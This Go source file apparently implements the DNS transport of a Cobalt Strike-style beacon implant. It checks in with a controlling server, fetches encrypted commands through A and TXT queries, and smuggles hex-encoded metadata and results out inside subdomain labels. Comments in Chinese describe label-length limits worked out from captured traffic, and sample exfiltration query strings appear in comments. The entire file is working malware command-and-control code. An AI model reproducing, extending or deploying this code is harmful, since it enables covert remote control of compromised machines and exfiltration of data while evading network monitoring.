package packet

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"github.com/miekg/dns"
	"main/config"
	"main/util"
	"net"
	"strconv"
)

const (
	DNS_A_NO_CHECKIN    = 240
	DNS_A_CHECKIN       = 241
	DNS_TXT_NO_CHECKIN  = 242
	DNS_TXT_CHECKIN     = 243
	DNS_AAAA_NO_CHECKIN = 244
	DNS_AAAA_CHECKIN    = 245
)

var dnsMask net.IP

// baseDomain DNS base domain
var baseDomain string

func init() {
	if config.IsDNS {
		dnsMask = net.ParseIP(config.DnsMaskString).To4()
		if dnsMask == nil {
			panic("invalid dnsMaskString: " + config.DnsMaskString)
		}
	}
}

func randomID() string {
	id := util.RandomInt(0x10000000, 0x7fffffff)
	//id = (id >> 1 << 1) | 1202
	return strconv.FormatInt(int64(id), 16)
}

func IPXor(ip net.IP, mask net.IP) net.IP {
	if ip.To4() == nil {
		return nil
	} else {
		return net.IPv4(ip[0]^mask[0], ip[1]^mask[1], ip[2]^mask[2], ip[3]^mask[3]).To4()
	}
}

// dnsQueryTXT send dns TXT query
func dnsQueryTXT(host string) (string, error) {
	client := dns.Client{}

	message := dns.Msg{}
	message.SetQuestion(host, dns.TypeTXT)

	response, _, err := client.Exchange(&message, config.DnsServer)
	if err != nil {
		return "", err
	}

	// print the response
	for _, answer := range response.Answer {
		if txt, ok := answer.(*dns.TXT); ok {
			if len(txt.Txt) > 0 {
				return txt.Txt[0], nil
			}
		}
	}
	return "", errors.New("no result found")
}

func dnsQueryA(host string) (net.IP, error) {
	util.Println(host)
	client := dns.Client{}

	message := dns.Msg{}
	message.SetQuestion(host, dns.TypeA)

	response, _, err := client.Exchange(&message, config.DnsServer)
	if err != nil {
		return nil, err
	}

	// print the response
	if len(response.Answer) > 0 {
		for _, answer := range response.Answer {
			if a, ok := answer.(*dns.A); ok {
				return IPXor(a.A.To4(), dnsMask), nil
			}
		}
	}
	return nil, errors.New("no result found")
}

func dnsQueryAAAA(host string) (net.IP, error) {
	client := dns.Client{}

	message := dns.Msg{}
	message.SetQuestion(host, dns.TypeAAAA)

	response, _, err := client.Exchange(&message, config.DnsServer)
	if err != nil {
		return nil, err
	}

	// print the response
	if len(response.Answer) > 0 {
		for _, answer := range response.Answer {
			if aaaa, ok := answer.(*dns.AAAA); ok {
				return aaaa.AAAA, nil
			}
		}
	}
	return nil, errors.New("no result found")
}

func CheckIn(metadata []byte) {
	//"pos.4336cfa8d5e36468bc93a9d19051e9a249e357558.ee559d02841198cf463224e023efc145cad8e3d4ad79be515d04d13e.debaf3340e6225d9dc7da06b328b767e548c0a5c4db98d78322813de.024b92cf7ed581f40f2c2c75a666527a6fdf2ddb52a4ec8a7930ba8c.12125751.4bc3fcbe.test.unknown"
	//"www.41ad5225baab3925d5d57b160061fd87d76c9d01f.5fc2821172aa454f20b3ea6a1bb8d70f49d033b05bd5049213db7702.2d88101875c12c52e97dd42b10330a59b68dff07f1f6d67cddde92d8.ac3dc399eae24528beba60781b6ac0596dd39c680e24a484cc3181db.166ba3ceb.8df6dbe.test.unknown"
	DNSPost(metadata, config.PostMetadataPrefix)
}

// fetch command
func DnsGet(metadata []byte) ([]byte, error) {
	ip, err := dnsQueryA(baseDomain)
	if err != nil {
		return nil, err
	}
	result := ip
	if result[0] == 0 && result[1] == 0 && result[2] == 0 && result[3] >= 240 && result[3] <= 245 {
		var record []byte
		switch result[3] {
		case DNS_A_NO_CHECKIN:
			record, err = DnsGetA(metadata, false)
		case DNS_A_CHECKIN:
			record, err = DnsGetA(metadata, true)
		case DNS_TXT_NO_CHECKIN:
			record, err = DnsGetTXT(metadata, false)
		case DNS_TXT_CHECKIN:
			record, err = DnsGetTXT(metadata, true)
		case DNS_AAAA_NO_CHECKIN:
			record, err = DnsGetAAAA(metadata, false)
		case DNS_AAAA_CHECKIN:
			record, err = DnsGetAAAA(metadata, true)
		default:
			return nil, errors.New("invalid A record: " + ip.String())
		}
		if err != nil {
			return nil, err
		}
		return record, err
	} else {
		// no cmd send
		return nil, nil
	}
}

// DnsGetA fetch command with DNS A query
func DnsGetA(metadata []byte, checkin bool) ([]byte, error) {
	if checkin {
		CheckIn(metadata)
	} else {
		return nil, errors.New("unimplemented method DnsGetA")
	}
	return nil, nil

}

// DnsGetTXT fetch command with DNS TXT query
func DnsGetTXT(metadata []byte, checkin bool) ([]byte, error) {
	if checkin {
		CheckIn(metadata)
	}
	cnt := 0
	requestID := randomID()
	cmdLenRaw, err := dnsQueryA(util.Sprintf("%s%x%s.%s", config.DnsTXT, cnt, requestID, baseDomain))
	if err != nil {
		return nil, err
	}
	cnt++
	cmdLength := int(binary.BigEndian.Uint32(cmdLenRaw))
	var result = ""
	for cmdLength > 0 {
		TXT, err := dnsQueryTXT(util.Sprintf("%s%x%s.%s", config.DnsTXT, cnt, requestID, baseDomain))
		if err != nil {
			return nil, err
		}
		cnt++
		// 这里的长度计算似乎会因为分段解码和合起来解码会有出入，但愿不会出问题?
		cmdLength -= base64.StdEncoding.DecodedLen(len(TXT))
		result += TXT
	}
	encryptCmd, err := base64.StdEncoding.DecodeString(result)
	if err != nil {
		return nil, err
	}
	return encryptCmd, nil
}

// fetch command with DNS AAAA query
func DnsGetAAAA(metadata []byte, checkin bool) ([]byte, error) {
	if checkin {
		CheckIn(metadata)
	} else {
		return nil, errors.New("unimplemented method DnsGetAAAA")
	}
	return nil, nil
}

// DNSPost post result to server
func DNSPost(payload []byte, prefix string) {
	cnt := 0
	requestID := randomID()
	for {
		// 这里的1用来表示数据长度这一项只有一级域名，先硬编码，应该不会有什么倒霉数据的长度是63位十六进制不能表示的吧。。。。
		// 理论上来说用query A TXT AAAA都是一样的，不关心结果，仅发送数据
		_, err := dnsQueryA(util.Sprintf("%s1%x.%x%s.%s", prefix, len(payload), cnt, requestID, baseDomain))
		if err != nil {
			util.Printf("DNSPost error: %v\n", err)
			util.Sleep()
		} else {
			break
		}
	}
	result := hex.EncodeToString(payload)
	// 很抽象的写法，一段长最大为56，照着流量先乱写
	availableLength := 248 - len(prefix) - len(baseDomain) - len(requestID) - len(util.Sprintf("%x", cnt)) - 15 // 不知道限制是多少，往大了减吧....不然会出现一个奇怪的错误
	// 分到四段域名里传输所以直接凑成四的倍数
	availableLength -= availableLength % 4
	sectionLength := availableLength / 4
	for len(result) > availableLength {
		cnt++
		for {
			_, err := dnsQueryA(util.Sprintf("%s4%s.%s.%s.%s.%x%s.%s", prefix, result[0:sectionLength], result[sectionLength:sectionLength*2], result[sectionLength*2:sectionLength*3], result[sectionLength*3:sectionLength*4], cnt, requestID, baseDomain))
			if err != nil {
				util.Printf("DNSPost error: %v\n", err)
				util.Sleep()
			} else {
				break
			}
		}
		result = result[availableLength:]
	}

	//"post.2f3016f406de0eb162f53533575f0fafbf1d31cb5006f357c1ac23963.3f44008606568ecfe9faea6634c9661864dc39fa9db742794f92ab87.52125751.4bc3fcbe.test.unknown"
	//"post.1632787257b400d6b04711d8917ebb1ff6aa3a4e281152503.62125751.4bc3fcbe.test.unknown"
	// 处理剩下的长度不足availableLength的部分，56是抓流量观察出来的单级域名中传输数据的最大长度
	cnt++
	segment := len(result) / 56
	remain := len(result) % 56
	var query string
	if remain != 0 {
		query = util.Sprintf("%s%x%s.", prefix, segment+1, result[0:remain])
	} else {
		query = util.Sprintf("%s%x", prefix, segment)
	}
	for i := 0; i < segment; i++ {
		query += util.Sprintf("%s.", result[remain+i*56:remain+(i+1)*56])
	}
	query += util.Sprintf("%x%s.%s", cnt, requestID, baseDomain)
	for {
		_, err := dnsQueryA(query)
		if err != nil {
			util.Printf("DNSPost error: %v\n", err)
			util.Sleep()
		} else {
			break
		}
	}
}
